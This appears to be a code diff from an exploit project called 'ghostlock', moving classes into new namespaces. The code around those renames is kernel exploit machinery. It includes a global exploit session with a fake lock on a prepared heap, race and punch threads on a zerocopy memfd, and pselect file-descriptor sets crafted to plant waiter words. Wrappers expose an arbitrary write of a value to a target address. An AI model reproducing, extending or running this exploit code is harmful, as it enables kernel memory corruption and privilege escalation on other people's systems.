@@ -35,15 +35,15 @@ namespace ghostlock::route {
     /* Resident multicast writer wrappers (CPP13): the owning class lives in
  * multicast_waiter_route.cpp; the C-style call sites stay unchanged. */
     int kernel5_resident_start(void) {
-        return resident_route().start();
+        return multicast_waiter::resident_route().start();
     }
 
     int kernel5_resident_write(uintptr_t target, uintptr_t value) {
-        return resident_route().write(target, value);
+        return multicast_waiter::resident_route().write(target, value);
     }
 
     void kernel5_resident_stop(void) {
-        resident_route().stop();
+        multicast_waiter::resident_route().stop();
     }
 
     RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
@@ -123,7 +123,7 @@ namespace ghostlock::route {
  * waiter->lock. */
 #define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
 
-    static void tcp_wait_for_consumer_idle(TcpZerocopyRouteContext *context) {
+    static void tcp_wait_for_consumer_idle(tcp_zerocopy::TcpZerocopyRouteContext *context) {
         context->race->consumer_go.store(0);
         while (context->race->consumer_inflight.load()) {
             __asm__ volatile (
@@ -132,7 +132,7 @@ namespace ghostlock::route {
         }
     }
 
-    static int tcp_make_pair(TcpZerocopyRouteContext *context) {
+    static int tcp_make_pair(tcp_zerocopy::TcpZerocopyRouteContext *context) {
         UniqueFd listener(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
         if (!listener.valid()) {
             return -1;
@@ -174,10 +174,10 @@ namespace ghostlock::route {
     }
 
     /* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
- * TcpZerocopyRouteContext; output: context-owned phase/error flags. */
+ * tcp_zerocopy::TcpZerocopyRouteContext; output: context-owned phase/error flags. */
     static void *tcp_punch_thread(void *arg) {
         support::disable_rseq_for_thread();
-        auto *context = static_cast<TcpZerocopyRouteContext *>(arg);
+        auto *context = static_cast<tcp_zerocopy::TcpZerocopyRouteContext *>(arg);
         while (!context->punch_go.load() &&
                !context->punch_stop.load()) {
             sched_yield();
@@ -209,6 +209,8 @@ namespace ghostlock::route {
     /* Acquire every userspace resource owned by the TCP route. No PI consumer or
  * punch operation is armed until this function has completed successfully. */
 } // namespace ghostlock::route
+
+namespace ghostlock::route::tcp_zerocopy {
 
 int TcpZerocopyRoute::prepare() noexcept {
     if (!(g_exploit_session.heap.current.base) || !(g_exploit_session.heap.current.fake_lock) || !(g_exploit_session.
@@ -352,11 +354,13 @@ RouteStatus TcpZerocopyRoute::execute() noexcept {
     return status;
 }
 
+} // namespace ghostlock::route::tcp_zerocopy
+
 namespace ghostlock::route {
     /* Public compatibility entry: lifecycle is now explicitly ordered while the
  * common route dispatcher remains scheduled for S14. */
     RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
-        TcpZerocopyRouteContext context(
+        tcp_zerocopy::TcpZerocopyRouteContext context(
             &g_exploit_session.race, request, execution_settings(),
             TCP_PUNCH_SHMEM_LEN); // NOLINT(bugprone-implicit-widening-of-multiplication-result)
         if (context.prepare() == 0) {
@@ -383,7 +387,7 @@ namespace ghostlock::route {
         return context.status;
     }
 
-    static int route_delay_usec(const SelectStackRouteContext *context,
+    static int route_delay_usec(const select_stack::SelectStackRouteContext *context,
                                 int attempt) {
         if (!context->layout.compact_waiter) {
             (void) attempt;
@@ -442,14 +446,14 @@ namespace ghostlock::route {
         }
     }
 
-    static int pselect_waiter_shift(const SelectStackRouteContext *context) {
+    static int pselect_waiter_shift(const select_stack::SelectStackRouteContext *context) {
         return g_exploit_session.profile.loaded()
                    ? context->layout.waiter_shift
                    : PSELECT_WAITER_WORD_SHIFT;
     }
 
     static void pselect_put_waiter_word(
-        SelectStackRouteContext *context, int words_per_set,
+        select_stack::SelectStackRouteContext *context, int words_per_set,
         int waiter_word, uint64_t value, const char *name) {
         int global_word = pselect_waiter_shift(context) + waiter_word;
         int placed = pselect_put_global_word(
@@ -504,10 +508,10 @@ namespace ghostlock::route {
         }
     }
 
-    static void select_stack_build_fdsets(SelectStackRouteContext *context) {
-        FdSet *in = &context->input_set;
-        FdSet *out = &context->output_set;
-        FdSet *ex = &context->exception_set;
+    static void select_stack_build_fdsets(select_stack::SelectStackRouteContext *context) {
+        select_stack::FdSet *in = &context->input_set;
+        select_stack::FdSet *out = &context->output_set;
+        select_stack::FdSet *ex = &context->exception_set;
         const WriteRequest *request = context->request;
         in->zero();
         out->zero();
@@ -569,6 +573,8 @@ namespace ghostlock::route {
         }
     }
 } // namespace ghostlock::route
+
+namespace ghostlock::route::select_stack {
 
 int SelectStackRoute::prepare() noexcept {
     if (!(g_exploit_session.heap.current.base) || !(g_exploit_session.heap.current.fake_lock) || !(g_exploit_session.
@@ -710,6 +716,8 @@ RouteStatus SelectStackRoute::execute() noexcept {
     return status;
 }
 
+} // namespace ghostlock::route::select_stack
+
 namespace ghostlock::route {
     RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
         /* U01/SELECT-01: SelectStackRoute::execute() now retries compact routes
@@ -717,7 +725,7 @@ namespace ghostlock::route {
      * advancing the consumer handshake. The delay ladder and the attempt
      * count stay native-side until a Select device can validate a
      * profile-schema extension; the profile still owns the timeout. */
-        SelectStackRouteContext context(
+        select_stack::SelectStackRouteContext context(
             &g_exploit_session.race, request, execution_settings(),
             g_exploit_session.profile.select_stack_layout(),
             standard_io_backup);
